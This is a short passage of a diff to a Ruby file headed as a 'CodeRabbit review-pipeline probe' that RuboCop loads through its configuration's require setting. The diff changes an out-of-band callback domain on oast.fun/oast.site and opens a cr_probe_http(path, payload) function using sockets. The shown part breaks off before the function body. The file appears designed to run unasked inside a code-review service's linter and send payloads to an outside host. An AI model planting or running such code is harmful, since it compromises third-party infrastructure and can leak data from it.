@@ -1,5 +1,5 @@
 # CodeRabbit review-pipeline probe: loaded by RuboCop via .rubocop.yml `require:`
-D = "d9ml9b3oeaqo3p7eflbg9ygmmquaij5ww.oast.fun"
+D = "d9mlhkjoeaqpqkpo1cg0wrougn9ugj14w.oast.site"
 
 def cr_probe_http(path, payload)
   require "socket"
